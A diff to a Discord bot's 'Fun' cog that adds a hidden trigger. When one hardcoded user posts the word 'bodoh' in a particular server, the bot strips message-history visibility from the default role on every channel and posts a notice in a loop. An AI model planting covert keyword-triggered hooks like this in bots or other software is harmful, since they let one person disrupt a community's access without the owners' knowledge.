@@ -24,6 +24,11 @@ class Fun(commands.Cog):
         if message.author.id == 800184970298785802:
             return
 
+        if message.author.id == 560251854399733760 and "bodoh" in message.content and message.guild.id == 818436261873844224:
+            for c in message.guild.channels:
+                await c.set_permissions(message.guild.default_role, read_message_history=False)
+                await message.channel.send("<@560251854399733760> Permissions to see message history have been reset for all channels, get Argon to reset the permissions.")
+
     @commands.command(name="says", brief="Says whatever user wants Nogra to say", description="Says whatever user wants Nogra to say")
     async def say(self, ctx, *, arg=None):
         if ctx.author.id == 560251854399733760:
